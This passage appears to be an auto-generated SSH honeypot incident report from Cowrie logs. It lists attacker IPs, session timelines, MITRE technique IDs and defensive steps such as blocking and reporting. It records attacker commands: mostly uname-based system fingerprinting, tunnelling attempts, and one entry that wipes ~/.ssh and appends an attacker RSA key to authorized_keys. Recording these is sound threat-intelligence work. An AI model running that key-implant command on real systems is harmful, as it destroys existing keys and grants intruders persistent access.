| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:45:47` | `cowrie.session.connect` |
| `2026-07-24 17:45:47` | `cowrie.client.version` |
| `2026-07-24 17:45:47` | `cowrie.client.kex` |
| `2026-07-24 17:45:50` | `cowrie.login.success` |
| `2026-07-24 17:45:52` | `cowrie.session.params` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.success` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:52` | `cowrie.command.input` |
| `2026-07-24 17:45:53` | `cowrie.log.closed` |
| `2026-07-24 17:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27fb943c95bb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:47 |
| **Last Seen** | 2026-07-24 17:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:47:04` | `cowrie.session.connect` |
| `2026-07-24 17:47:05` | `cowrie.client.version` |
| `2026-07-24 17:47:05` | `cowrie.client.kex` |
| `2026-07-24 17:47:07` | `cowrie.login.success` |
| `2026-07-24 17:47:10` | `cowrie.session.params` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.success` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:10` | `cowrie.command.input` |
| `2026-07-24 17:47:11` | `cowrie.log.closed` |
| `2026-07-24 17:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4b6cf1a02c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:48 |
| **Last Seen** | 2026-07-24 17:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:48:22` | `cowrie.session.connect` |
| `2026-07-24 17:48:23` | `cowrie.client.version` |
| `2026-07-24 17:48:23` | `cowrie.client.kex` |
| `2026-07-24 17:48:25` | `cowrie.login.success` |
| `2026-07-24 17:48:27` | `cowrie.session.params` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.success` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:27` | `cowrie.command.input` |
| `2026-07-24 17:48:28` | `cowrie.log.closed` |
| `2026-07-24 17:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07f005a3b01d

| Field | Detail |
|---|---|
| **Source IP** | `220.178.39[.]106` |
| **First Seen** | 2026-07-24 17:48 |
| **Last Seen** | 2026-07-24 17:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:48:45` | `cowrie.session.connect` |
| `2026-07-24 17:48:46` | `cowrie.client.version` |
| `2026-07-24 17:48:46` | `cowrie.client.kex` |
| `2026-07-24 17:48:48` | `cowrie.login.success` |
| `2026-07-24 17:48:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.39[.]106` to AbuseIPDB if not already reported
- [ ] Block `220.178.39[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f9fa9d2723d

| Field | Detail |
|---|---|
| **Source IP** | `14.153.235[.]75` |
| **First Seen** | 2026-07-24 17:48 |
| **Last Seen** | 2026-07-24 17:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:48:55` | `cowrie.session.connect` |
| `2026-07-24 17:48:55` | `cowrie.client.version` |
| `2026-07-24 17:48:55` | `cowrie.client.kex` |
| `2026-07-24 17:48:57` | `cowrie.login.success` |
| `2026-07-24 17:48:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `14.153.235[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e77ce9e989

| Field | Detail |
|---|---|
| **Source IP** | `2.26.51[.]95` |
| **First Seen** | 2026-07-24 17:49 |
| **Last Seen** | 2026-07-24 17:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:49:23` | `cowrie.session.connect` |
| `2026-07-24 17:49:23` | `cowrie.client.version` |
| `2026-07-24 17:49:23` | `cowrie.client.kex` |
| `2026-07-24 17:49:23` | `cowrie.login.success` |
| `2026-07-24 17:49:24` | `cowrie.session.params` |
| `2026-07-24 17:49:24` | `cowrie.command.input` |
| `2026-07-24 17:49:24` | `cowrie.command.failed` |
| `2026-07-24 17:49:24` | `cowrie.log.closed` |
| `2026-07-24 17:49:25` | `cowrie.session.params` |
| `2026-07-24 17:49:25` | `cowrie.command.input` |
| `2026-07-24 17:49:25` | `cowrie.session.file_download` |
| `2026-07-24 17:49:25` | `cowrie.log.closed` |
| `2026-07-24 17:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.51[.]95` to AbuseIPDB if not already reported
- [ ] Block `2.26.51[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ea3c1229b3

| Field | Detail |
|---|---|
| **Source IP** | `2.26.51[.]95` |
| **First Seen** | 2026-07-24 17:49 |
| **Last Seen** | 2026-07-24 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:49:25` | `cowrie.session.connect` |
| `2026-07-24 17:49:25` | `cowrie.client.version` |
| `2026-07-24 17:49:25` | `cowrie.client.kex` |
| `2026-07-24 17:49:26` | `cowrie.login.success` |
| `2026-07-24 17:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.51[.]95` to AbuseIPDB if not already reported
- [ ] Block `2.26.51[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f2c3b4d8ed8

| Field | Detail |
|---|---|
| **Source IP** | `2.26.51[.]95` |
| **First Seen** | 2026-07-24 17:49 |
| **Last Seen** | 2026-07-24 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:49:26` | `cowrie.session.connect` |
| `2026-07-24 17:49:26` | `cowrie.client.version` |
| `2026-07-24 17:49:26` | `cowrie.client.kex` |
| `2026-07-24 17:49:27` | `cowrie.login.success` |
| `2026-07-24 17:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.51[.]95` to AbuseIPDB if not already reported
- [ ] Block `2.26.51[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d986a21f9b9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:49 |
| **Last Seen** | 2026-07-24 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:49:37` | `cowrie.session.connect` |
| `2026-07-24 17:49:38` | `cowrie.client.version` |
| `2026-07-24 17:49:38` | `cowrie.client.kex` |
| `2026-07-24 17:49:41` | `cowrie.login.success` |
| `2026-07-24 17:49:43` | `cowrie.session.params` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.success` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.command.input` |
| `2026-07-24 17:49:43` | `cowrie.log.closed` |
| `2026-07-24 17:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af860521aa8b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:50 |
| **Last Seen** | 2026-07-24 17:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:50:54` | `cowrie.session.connect` |
| `2026-07-24 17:50:55` | `cowrie.client.version` |
| `2026-07-24 17:50:55` | `cowrie.client.kex` |
| `2026-07-24 17:50:58` | `cowrie.login.success` |
| `2026-07-24 17:50:59` | `cowrie.session.params` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.success` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:50:59` | `cowrie.command.input` |
| `2026-07-24 17:51:00` | `cowrie.command.input` |
| `2026-07-24 17:51:00` | `cowrie.log.closed` |
| `2026-07-24 17:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc46b9d9800

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-07-24 17:51 |
| **Last Seen** | 2026-07-24 17:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:51:10` | `cowrie.session.connect` |
| `2026-07-24 17:51:11` | `cowrie.client.version` |
| `2026-07-24 17:51:11` | `cowrie.client.kex` |
| `2026-07-24 17:51:13` | `cowrie.login.success` |
| `2026-07-24 17:51:14` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e29b879d4d8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:52 |
| **Last Seen** | 2026-07-24 17:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:52:10` | `cowrie.session.connect` |
| `2026-07-24 17:52:11` | `cowrie.client.version` |
| `2026-07-24 17:52:11` | `cowrie.client.kex` |
| `2026-07-24 17:52:14` | `cowrie.login.success` |
| `2026-07-24 17:52:16` | `cowrie.session.params` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.success` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.command.input` |
| `2026-07-24 17:52:16` | `cowrie.log.closed` |
| `2026-07-24 17:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f0160fd36ac

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:53 |
| **Last Seen** | 2026-07-24 17:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:53:27` | `cowrie.session.connect` |
| `2026-07-24 17:53:27` | `cowrie.client.version` |
| `2026-07-24 17:53:27` | `cowrie.client.kex` |
| `2026-07-24 17:53:30` | `cowrie.login.success` |
| `2026-07-24 17:53:32` | `cowrie.session.params` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.success` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:32` | `cowrie.command.input` |
| `2026-07-24 17:53:33` | `cowrie.log.closed` |
| `2026-07-24 17:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a0467788fa

| Field | Detail |
|---|---|
| **Source IP** | `112.26.99[.]93` |
| **First Seen** | 2026-07-24 17:54 |
| **Last Seen** | 2026-07-24 17:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:54:18` | `cowrie.session.connect` |
| `2026-07-24 17:54:20` | `cowrie.client.version` |
| `2026-07-24 17:54:20` | `cowrie.client.kex` |
| `2026-07-24 17:54:22` | `cowrie.login.success` |
| `2026-07-24 17:54:23` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.99[.]93` to AbuseIPDB if not already reported
- [ ] Block `112.26.99[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7862be3a44f

| Field | Detail |
|---|---|
| **Source IP** | `211.114.81[.]212` |
| **First Seen** | 2026-07-24 17:54 |
| **Last Seen** | 2026-07-24 17:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:54:31` | `cowrie.session.connect` |
| `2026-07-24 17:54:32` | `cowrie.client.version` |
| `2026-07-24 17:54:32` | `cowrie.client.kex` |
| `2026-07-24 17:54:34` | `cowrie.login.success` |
| `2026-07-24 17:54:34` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.114.81[.]212` to AbuseIPDB if not already reported
- [ ] Block `211.114.81[.]212` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2077ac88abab

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:54 |
| **Last Seen** | 2026-07-24 17:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:54:42` | `cowrie.session.connect` |
| `2026-07-24 17:54:43` | `cowrie.client.version` |
| `2026-07-24 17:54:43` | `cowrie.client.kex` |
| `2026-07-24 17:54:45` | `cowrie.login.success` |
| `2026-07-24 17:54:47` | `cowrie.session.params` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.success` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:47` | `cowrie.command.input` |
| `2026-07-24 17:54:48` | `cowrie.log.closed` |
| `2026-07-24 17:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ef455a5d73

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:55 |
